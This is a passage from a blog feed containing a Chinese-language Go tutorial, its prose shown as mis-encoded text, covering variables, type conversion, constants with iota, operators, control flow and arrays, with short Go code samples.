class="string">&quot;ä¸­æ–‡&quot;</span></span><br><span class="line">fmt.Println(chinese)</span><br></pre></td></tr></table></figure><p>ä»ä¸¥æ ¼æ„ä¹‰ä¸Šè®²ï¼Œ type newInt int, è¿™é‡Œ newInt å¹¶ä¸èƒ½è¯´æ˜¯ intçš„åˆ«åï¼Œè€Œåªæ˜¯åº•å±‚æ•°æ®ç»“æ„ç›¸åŒï¼Œåœ¨è¿™é‡Œç§°ä¸ºè‡ªå®šä¹‰ç±»å‹ï¼Œ<strong>åœ¨è¿›è¡Œç±»å‹è½¬æ¢æ—¶ä»æ—§éœ€è¦æ˜¾å¼è½¬æ¢</strong>ï¼Œä½† byte å’Œ rune ç¡®ç¡®å®å®ä¸º uint8 å’Œ int32 çš„åˆ«åï¼Œå¯ä»¥ç›¸äº’è¿›è¡Œè½¬æ¢ã€‚</p><h2 id="å•ä¸ªå˜é‡çš„å£°æ˜ä¸èµ‹å€¼">å•ä¸ªå˜é‡çš„å£°æ˜ä¸èµ‹å€¼</h2><ul><li>å˜é‡çš„å£°æ˜æ ¼å¼ï¼švar <å˜é‡åç§°><å˜é‡ç±»å‹></li><li>å˜é‡çš„èµ‹å€¼æ ¼å¼ï¼š<å˜é‡åç§°>=<è¡¨è¾¾å¼></li><li>å£°æ˜çš„åŒæ—¶èµ‹å€¼ï¼švar <å˜é‡åç§°>[å˜é‡ç±»å‹]=<è¡¨è¾¾å¼></li><li>å£°æ˜çš„åŒæ—¶èµ‹å€¼æœ€ç®€å½¢å¼ï¼š<å˜é‡åç§°> := <è¡¨è¾¾å¼> goç¼–è¯‘å™¨ä¼šæ ¹æ®èµ‹çš„å€¼è¿›è¡Œç±»å‹æ¨æ–­, è€Œ <code>:</code> ç›¸å½“äº var</li></ul><p>å£°æ˜ä¸èµ‹å€¼åˆ†å¼€çš„å½¢å¼åº”ç”¨åœºæ™¯ï¼šå½“ä½ éœ€è¦åœ¨åˆ†æ”¯ç»“æ„ä¸­ä½¿ç”¨ï¼Œä½†æ˜¯åœ¨ç»“æŸåˆ†æ”¯åˆ†æ”¯ç»“æ„åï¼Œè¿˜éœ€è¦ä½¿ç”¨å®ƒï¼Œé‚£ä¹ˆå°±éœ€è¦æå‰åœ¨å¤–é¢å£°æ˜ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span></span><br><span class="line">a = <span class="number">2</span> <span class="comment">//a = 1.1 æ˜¯é”™è¯¯çš„ï¼Œä¸èƒ½éšå¼è½¬æ¢</span></span><br><span class="line"><span class="keyword">var</span> b <span class="type">int</span> = <span class="number">3</span></span><br><span class="line"><span class="keyword">var</span> c = <span class="number">4</span>  <span class="comment">//å› ä¸º goç¼–è¯‘å™¨å¯ä»¥è¿›è¡Œç±»å‹æ¨æ–­ï¼Œå› æ­¤å£°æ˜åŒæ—¶èµ‹å€¼æ—¶ï¼Œå¯ä»¥çœç•¥ç±»å‹ã€‚</span></span><br><span class="line">d := <span class="literal">false</span> <span class="comment">//å£°æ˜åŒæ—¶èµ‹å€¼ çš„æœ€ç®€å½¢å¼ï¼Œ go ç¼–è¯‘å™¨ä¼šæ ¹æ®èµ‹çš„å€¼è¿›è¡Œç±»å‹æ¨æ–­</span></span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(b)</span><br><span class="line">fmt.Println(c)</span><br><span class="line">fmt.Println(d)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¤šä¸ªå˜é‡çš„å£°æ˜ä¸èµ‹å€¼">å¤šä¸ªå˜é‡çš„å£°æ˜ä¸èµ‹å€¼</h2><ul><li>å…¨å±€å˜é‡çš„å£°æ˜å¯ä½¿ç”¨ var() çš„æ–¹å¼è¿›è¡Œç®€å†™</li><li>å…¨å±€å˜é‡çš„å£°æ˜ä¸å¯ä»¥çœç•¥ varï¼Œä½†å¯ä½¿ç”¨å¹¶è¡Œæ–¹å¼</li><li>æ‰€æœ‰å˜é‡éƒ½å¯ä»¥ä½¿ç”¨ç±»å‹æ¨æ–­</li><li>var() å˜é‡ç»„å¯ä»¥åœ¨å‡½æ•°ä½“å†…ç”¨äºå£°æ˜å±€éƒ¨å˜é‡ï¼Œæ„Ÿè°¢ HuberyæŒ‡å‡ºï¼Œä½†å¹¶ä¸å»ºè®®è¿™æ ·ä½¿ç”¨ã€‚</li></ul><p>è¡¥å……ï¼šä½¿ç”¨ç©ºç™½ç¬¦å· <code>_</code>å¯¹èµ‹å€¼è¿›è¡Œå¿½ç•¥ï¼Œåœ¨æ¯”å¦‚ï¼šæ¥å—å‡½æ•°å¤šä¸ªè¿”å›å€¼çš„åœºæ™¯åŠå…¶æœ‰ç”¨</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">var1, var2 = <span class="number">5</span>, <span class="number">6</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a, _, c, d := <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span></span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(c)</span><br><span class="line">fmt.Println(d)</span><br><span class="line">fmt.Println(d)</span><br><span class="line">fmt.Println(var1)</span><br><span class="line">fmt.Println(var2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å˜é‡çš„ç±»å‹è½¬æ¢">å˜é‡çš„ç±»å‹è½¬æ¢</h2><ul><li>Go ä¸­ä¸å­˜åœ¨éšå¼è½¬æ¢ï¼Œæ‰€æœ‰ç±»å‹è½¬æ¢å¿…é¡»æ˜¾å¼å£°æ˜</li><li>è½¬æ¢åªèƒ½å‘ç”Ÿåœ¨ä¸¤ç§ç›¸äº’å…¼å®¹çš„ç±»å‹ä¹‹é—´ï¼ˆæ³¨:å¸ƒå°”ç±»å‹ä¸æ•´å‹ä¸å…¼å®¹ï¼‰</li><li>ç±»å‹è½¬æ¢çš„æ ¼å¼ï¼š <ValueA> [:]= <TypeOfValueA>(<ValueB>)</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := <span class="number">1.2</span></span><br><span class="line"><span class="keyword">var</span> b <span class="type">int</span> = <span class="type">int</span>(a)</span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå°†æ•°å­—è½¬æ¢ä¸º string ä¼šå¯¹åº”ä¸º ascii ç ä¸­çš„å­—ç¬¦ï¼Œå¦‚æœåªæƒ³æ•°å­—è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹çš„æ•°å­—ï¼Œå¯ä»¥ä½¿ç”¨ "strconv" åŒ… ä¸­çš„ Itoaå‡½æ•°(å½“ç„¶ï¼Œ ä¹Ÿæœ‰ Atoi èµ·ç›¸åä½œç”¨ã€‚)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;math&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line"><span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span> = <span class="number">65</span></span><br><span class="line">b := <span class="type">string</span>(a)</span><br><span class="line">c := strconv.Itoa(a)</span><br><span class="line">fmt.Println(reflect.TypeOf(a))</span><br><span class="line">fmt.Println(reflect.TypeOf(c))</span><br><span class="line">fmt.Println(b)</span><br><span class="line">fmt.Println(c)</span><br></pre></td></tr></table></figure><p>OUTPUT: <code>int string A 65</code></p><h1 id="å¸¸é‡ä¸è¿ç®—ç¬¦">å¸¸é‡ä¸è¿ç®—ç¬¦</h1><h2 id="å¸¸é‡çš„å®šä¹‰">å¸¸é‡çš„å®šä¹‰</h2><ul><li><strong>å¸¸é‡çš„å€¼åœ¨ç¼–è¯‘æ—¶å°±å·²ç»ç¡®å®š</strong></li><li>å¸¸é‡çš„å®šä¹‰æ ¼å¼ä¸å˜é‡åŸºæœ¬ç›¸åŒ</li><li>ç­‰å·å³ä¾§å¿…é¡»æ˜¯å¸¸é‡æˆ–è€…å¸¸é‡è¡¨è¾¾å¼</li><li>å¸¸é‡è¡¨è¾¾å¼ä¸­çš„å‡½æ•°å¿…é¡»æ˜¯å†…ç½®å‡½æ•°</li><li>å¸¸é‡ä¸€èˆ¬ä½¿ç”¨å…¨å¤§å†™å­—æ¯ï¼Œåƒæ˜ŸæœŸ ç­‰å¤§å®¶éƒ½ç†ŸçŸ¥çš„å¯ä»¥ä½¿ç”¨å›ºå®šå†™æ³•å¦‚æœä½ æƒ³è¦å¸¸é‡ä¸æš´éœ²ç»™å¤–éƒ¨</li></ul><h2 id="å¸¸é‡çš„åˆå§‹åŒ–è§„åˆ™ä¸æšä¸¾">å¸¸é‡çš„åˆå§‹åŒ–è§„åˆ™ä¸æšä¸¾</h2><ul><li>åœ¨å®šä¹‰å¸¸é‡ç»„æ—¶ï¼Œå¦‚æœä¸æä¾›åˆå§‹å€¼ï¼Œåˆ™è¡¨ç¤ºå°†ä½¿ç”¨<strong>ä¸Šè¡Œçš„è¡¨è¾¾å¼</strong><strong>æ³¨æ„ï¼šä½¿ç”¨ç›¸åŒçš„è¡¨è¾¾å¼ä¸ä»£è¡¨å…·æœ‰ç›¸åŒçš„å€¼</strong></li><li>ä½¿ç”¨ä¸Šä¸€è¡Œçš„è¡¨è¾¾å¼æ—¶ï¼Œæ³¨æ„ï¼šç¬¬ä¸€è¡Œä¸èƒ½ä½¿ç”¨ï¼Œå› ä¸ºç¬¬ä¸€è¡Œæ²¡æœ‰ä¸Šä¸€è¡Œemm</li><li>ä½¿ç”¨ä¸Šä¸€è¡Œè¡¨è¾¾å¼æ—¶ï¼Œ å¸¸é‡ä¸ªæ•°éœ€è¦å¯¹åº”, æ¯”å¦‚ï¼š</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span>(</span><br><span class="line">    var1, var2 = <span class="number">1</span>, <span class="string">&quot;f&quot;</span></span><br><span class="line">    var3, var4</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>å¸¸é‡å¯ä»¥å•ä¸ªå£°æ˜èµ‹å€¼ï¼Œä¹Ÿå¯ä»¥å¹¶è¡Œï¼Œå¸¸é‡ç»„å£°æ˜èµ‹å€¼ã€‚</li><li>å…¨å±€å˜é‡ä¸æ˜¯å¸¸é‡ï¼Œä¸èƒ½ç”¨äºåˆå§‹åŒ–å¸¸é‡ã€‚</li></ul><h3 id="itoa">itoa</h3><p>iota æ˜¯ golang è¯­è¨€çš„å¸¸é‡è®¡æ•°å™¨,åªèƒ½åœ¨å¸¸é‡çš„è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚</p><p>iota åœ¨ const å…³é”®å­—å‡ºç°æ—¶å°†è¢«é‡ç½®ä¸º 0(constå†…éƒ¨çš„ç¬¬ä¸€è¡Œä¹‹å‰)ï¼Œ<strong>constå¸¸é‡ç»„</strong>ä¸­æ¯<strong>æ–°å¢ä¸€è¡Œå¸¸é‡å£°æ˜</strong>å°†ä½¿ iotaè®¡æ•°ä¸€æ¬¡(iota å¯ç†è§£ä¸º const å¸¸é‡ç»„ä¸­çš„è¡Œç´¢å¼•)ï¼Œ æ³¨æ„ï¼šiotaåœ¨å¸¸é‡ç»„ä¸­è‡ªåŠ¨è®¡æ•°ï¼Œä¸ä½ ä½¿ä¸ä½¿ç”¨æ— å…³ã€‚</p><p>ä½¿ç”¨ iota èƒ½ç®€åŒ–å®šä¹‰ï¼Œé€šè¿‡åˆå§‹åŒ–è§„åˆ™ä¸ iota å¯ä»¥è¾¾åˆ°æšä¸¾çš„æ•ˆæœæ¯é‡åˆ°ä¸€ä¸ª const å…³é”®å­—ï¼Œiota å°±ä¼šé‡ç½®ä¸º 0</p><p>ä¸¾ä¾‹å¦‚ä¸‹ï¼š</p><ol type="1"><li><p>iota åªèƒ½åœ¨å¸¸é‡çš„è¡¨è¾¾å¼ä¸­ä½¿ç”¨ã€‚ <code>fmt.Println(iota)</code>ç¼–è¯‘é”™è¯¯ï¼š undefined: iota</p></li><li><p>æ¯æ¬¡ const å‡ºç°æ—¶ï¼Œéƒ½ä¼šè®© iota åˆå§‹åŒ–ä¸º 0.<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="literal">iota</span> <span class="comment">// a=0</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">  b = <span class="literal">iota</span>     <span class="comment">//b=0</span></span><br><span class="line">  c            <span class="comment">//c=1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure></p></li><li><p>ä½¿ç”¨ iota æ¨¡æ‹Ÿè®¡ç®—æœºçš„å­˜å‚¨å•ä½å¢åŠ </p></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">B <span class="type">float64</span> = <span class="number">1</span> &lt;&lt; (<span class="number">10</span> * <span class="literal">iota</span>)</span><br><span class="line">KB</span><br><span class="line">MB</span><br><span class="line">GB</span><br><span class="line">TB</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>3ã€è‡ªå®šä¹‰ç±»å‹</p><p>è‡ªå¢é•¿å¸¸é‡ç»å¸¸åŒ…å«ä¸€ä¸ªè‡ªå®šä¹‰æšä¸¾ç±»å‹ï¼Œå…è®¸ä½ ä¾é ç¼–è¯‘å™¨å®Œæˆè‡ªå¢è®¾ç½®ã€‚</p><p>type Stereotype int</p><p>const ( TypicalNoob Stereotype = iota // 0 TypicalHipster // 1TypicalUnixWizard // 2 TypicalStartupFounder // 3 )</p><h2 id="è¿ç®—ç¬¦">è¿ç®—ç¬¦</h2><p>Go ä¸­çš„è¿ç®—ç¬¦å‡æ˜¯ä»å·¦è‡³å³ç»“åˆ</p><p>ä¼˜å…ˆçº§ï¼ˆä»é«˜åˆ°ä½ï¼‰</p><p>-<code>^      !</code> ï¼ˆä¸€å…ƒè¿ç®—ç¬¦ï¼‰</p><ul><li><code>*       /    %    &lt;&lt;    &gt;&gt;    &amp;      &amp;^</code></li><li><code>+      -     |      ^</code> ï¼ˆäºŒå…ƒè¿ç®—ç¬¦ï¼‰</li><li><code>==   !=   &lt;    &lt;=    &gt;=    &gt;</code></li><li><code>&lt;-</code> ï¼ˆä¸“é—¨ç”¨äº channelï¼‰</li><li><code>&amp;&amp;</code></li><li><code>||</code></li></ul><p>ä¸¤ä¸ª <code>^</code>çš„åŒºåˆ«ï¼š</p><ol type="1"><li>å½“ <code>^</code> å’Œä¸€ä¸ªè¿ç®—æ•°åœ¨ä¸€èµ·æ—¶ï¼Œä¸ºä¸€å…ƒè¿ç®—ç¬¦</li><li>ä¸€å…ƒè¿ç®—ç¬¦ä¼˜å…ˆçº§é«˜äºäºŒå…ƒè¿ç®—ç¬¦</li></ol><p>äºŒå…ƒä½è¿ç®—æ“ä½œç¬¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">6: 0110</span><br><span class="line">11: 1011</span><br><span class="line">----------</span><br><span class="line">&amp; : 0010 = 2æŒ‰ä½ä¸</span><br><span class="line">| : 1111 = 15æŒ‰ä½æˆ–</span><br><span class="line">^ : 1101 = 13æŒ‰ä½å¼‚æˆ–</span><br><span class="line">&amp;^: 0100 = 4æŒ‰ä½ç½®é›¶</span><br></pre></td></tr></table></figure><p><code>&amp;&amp;</code> ï¼šé€»è¾‘ä¸, å…·æœ‰çŸ­è·¯ä½œç”¨ï¼Œå¯ä»¥é€šè¿‡åˆ¤æ–­å‰é¢æ¡ä»¶æ˜¯å¦æ»¡è¶³ï¼Œ æ¥å†³å®šæ˜¯å¦æ‰§è¡Œåé¢çš„æ“ä½œã€‚<code>||</code> :é€»è¾‘æˆ–ï¼Œä¹Ÿæœ‰çŸ­è·¯ä½œç”¨</p><h1 id="åˆ¤æ–­è¯­å¥-if">åˆ¤æ–­è¯­å¥ if</h1><ul><li>æ¡ä»¶è¡¨è¾¾å¼æ²¡æœ‰æ‹¬å·</li><li>æ”¯æŒä¸€ä¸ªåˆå§‹åŒ–è¡¨è¾¾å¼ï¼ˆå¯ä»¥æ˜¯å¹¶è¡Œæ–¹å¼ï¼‰</li><li>å·¦å¤§æ‹¬å·å¿…é¡»å’Œæ¡ä»¶è¯­å¥æˆ– else åœ¨åŒä¸€è¡Œ</li><li>æ”¯æŒå•è¡Œæ¨¡å¼</li><li>åˆå§‹åŒ–è¯­å¥ä¸­çš„å˜é‡ä¸º blockçº§åˆ«ï¼ŒåŒæ—¶éšè—å¤–éƒ¨åŒåå˜é‡ï¼ˆå³ï¼šåŒåçš„å±€éƒ¨å˜é‡ä¸å…¨å±€å˜é‡åœ¨å±€éƒ¨ä¼šéšè—å…¨å±€å˜é‡ï¼‰</li></ul><p>æ³¨æ„ï¼šåˆå§‹åŒ–è¡¨è¾¾å¼ä¹‹é—´ç”¨åˆ†å·åˆ†å‰²ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> a, b := <span class="number">1</span>, <span class="number">2</span>; a &lt; <span class="number">2</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="å¾ªç¯è¯­å¥-for">å¾ªç¯è¯­å¥ for</h1><ul><li>Go åªæœ‰ for ä¸€ä¸ªå¾ªç¯è¯­å¥å…³é”®å­—ï¼Œä½†æ”¯æŒ 3 ç§å½¢å¼</li><li>åˆå§‹åŒ–å’Œæ­¥è¿›è¡¨è¾¾å¼å¯ä»¥æ˜¯å¤šä¸ªå€¼</li><li>æ¡ä»¶è¯­å¥æ¯æ¬¡å¾ªç¯éƒ½ä¼šè¢«é‡æ–°æ‰§è¡Œã€æ£€æŸ¥ï¼Œå› æ­¤ï¼Œä¸å»ºè®®åœ¨æ¡ä»¶è¯­å¥ä¸­ä½¿ç”¨å‡½æ•°ï¼Œå°½é‡æå‰è®¡ç®—å¥½æ¡ä»¶å¹¶ä»¥å˜é‡å’Œå¸¸é‡ä»£æ›¿ã€‚æ¯”å¦‚ï¼šå­—ç¬¦ä¸²æ¯”è¾ƒä¸ len(str1) çš„å¤§å°æ—¶ï¼Œ å¯ä»¥å…ˆåœ¨å¤–é¢æ±‚å‡º lençš„å€¼æ¥ï¼Œç„¶åæ”¾åˆ° i &lt; str_len é‚£é‡Œï¼Œ å°±ä¸ç”¨æ¯æ¬¡å¾ªç¯ç®—äº†ã€‚</li><li>å·¦å¤§æ‹¬å·å¿…é¡»å’Œæ¡ä»¶è¯­å¥åœ¨åŒä¸€è¡Œä½¿ç”¨ã€‚</li></ul><p>ä¸‰ç§å½¢å¼ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">a++</span><br><span class="line"><span class="keyword">if</span> a &gt; <span class="number">3</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(a)</span><br><span class="line">fmt.Println(<span class="string">&quot;---------&quot;</span>)</span><br><span class="line"></span><br><span class="line">b := <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> b &lt; <span class="number">3</span> &#123;</span><br><span class="line">b++</span><br><span class="line">fmt.Println(b)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;---------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Here&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">3</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="é€‰æ‹©è¯­å¥-switch">é€‰æ‹©è¯­å¥ switch</h1><ul><li>å¯ä»¥ä½¿ç”¨ä»»ä½•ç±»å‹æˆ–è¡¨è¾¾å¼ä½œä¸ºæ¡ä»¶è¯­å¥</li><li>ä¸éœ€è¦å†™ breakï¼Œä¸€æ—¦æ¡ä»¶ç¬¦åˆè‡ªåŠ¨ç»ˆæ­¢</li><li>å¦‚å¸Œæœ›ç»§ç»­æ‰§è¡Œä¸‹ä¸€ä¸ª caseï¼Œéœ€ä½¿ç”¨ fallthrough è¯­å¥</li><li>æ”¯æŒä¸€ä¸ª<strong>åˆå§‹åŒ–è¡¨è¾¾å¼ï¼ˆå¯ä»¥æ˜¯å¹¶è¡Œæ–¹å¼ï¼‰ï¼Œå³ä¾§éœ€è·Ÿåˆ†å·</strong></li><li>å·¦å¤§æ‹¬å·å¿…é¡»å’Œæ¡ä»¶è¯­å¥åœ¨åŒä¸€è¡Œ <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200308152347301_1869586488.png" /></li></ul><h1 id="è·³è½¬è¯­å¥-goto-break-continue">è·³è½¬è¯­å¥ goto, break,continue</h1><ul><li>ä¸‰ä¸ªè¯­æ³•éƒ½å¯ä»¥é…åˆæ ‡ç­¾ä½¿ç”¨</li><li>æ ‡ç­¾ååŒºåˆ†å¤§å°å†™ï¼Œè‹¥ä¸ä½¿ç”¨ä¼šé€ æˆç¼–è¯‘é”™è¯¯</li><li>break ä¸ continue é…åˆæ ‡ç­¾å¯ç”¨äºå¤šå±‚å¾ªç¯çš„è·³å‡º, breakï¼Œ continueå¦‚æœä¸è·Ÿæ ‡ç­¾çš„è¯ï¼Œå°±æ˜¯åªé’ˆå¯¹å†…å±‚å¾ªç¯ <code>break LABEL1</code>ï¼Œåˆ™é’ˆå¯¹ä¸ LABEL1 åŒçº§å¾ªç¯è¿›è¡Œ breakï¼Œ å³ï¼šbreak åˆ°ä¸ LABEL1åŒçº§çš„å¾ªç¯çš„å¤–é¢ã€‚ <code>continue LABEL1</code>, åˆ™é’ˆå¯¹ä¸ LABEL1åŒçº§å¾ªç¯è¿›è¡Œ continueï¼Œ å³ï¼šè·³è¿‡æœ¬è½®å¾ªç¯ï¼Œå»æ‰§è¡Œå’Œ LABEL1åŒçº§çš„å¾ªç¯</li><li>goto æ˜¯è°ƒæ•´æ‰§è¡Œä½ç½®ï¼Œä¸å…¶å®ƒ 2 ä¸ªè¯­å¥é…åˆæ ‡ç­¾çš„ç»“æœå¹¶ä¸ç›¸åŒ</li></ul><h1 id="æ•°ç»„">æ•°ç»„</h1><ul><li>å®šä¹‰æ•°ç»„æ ¼å¼ï¼š<code>var &lt;varName&gt; [n]type</code>(n &gt;0)</li><li>æ•°ç»„çš„é•¿åº¦ä¹Ÿæ˜¯ç±»å‹çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤å…·æœ‰ä¸åŒé•¿åº¦çš„æ•°ç»„ä¸ºä¸åŒç±»å‹ã€‚</li><li>æ³¨æ„ï¼šåŒºåˆ†æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆä¸æŒ‡é’ˆæ•°ç»„</li><li><strong>æ•°ç»„åœ¨ Go ä¸­ä¸ºå€¼ç±»å‹</strong></li><li>æ•°ç»„ä¹‹é—´å¯ä»¥ä½¿ç”¨ <code>==</code> æˆ– <code>ï¼=</code>è¿›è¡Œæ¯”è¾ƒï¼Œä½†ä¸å¯ä»¥ä½¿ç”¨ <code>&lt;</code> æˆ– <code>&gt;</code></li><li>å¯ä»¥ä½¿ç”¨ <code>new</code>æ¥åˆ›å»ºæ•°ç»„ï¼Œè¯æ–¹æ³•è¿”å›ä¸€ä¸ªæŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆã€‚</li><li>Go æ”¯æŒå¤šç»´æ•°ç»„</li></ul><p>å½“ä½ æƒ³åœ¨å£°æ˜æ•°ç»„æ—¶ï¼Œåˆå§‹åŒ–æ•°ç»„çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹å¼ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a := [2]int&#123;1, 2&#125; å£°æ˜å¹¶èµ‹å€¼</span></span><br><span class="line"><span class="comment">// a := [...]int&#123;1,2,3&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//var a [2]int</span></span><br><span class="line">a := [<span class="number">2</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>&#125;</span><br><span class="line">fmt.Println(a)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">fmt.Println(a[i])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Go ä¸­çš„ byteã€rune ä¸ string</title>
      <link href="/blog/2022/10/16/programming/go/go_string/"/>
      <url>/blog/2022/10/16/programming/go/go_string/</url>
      
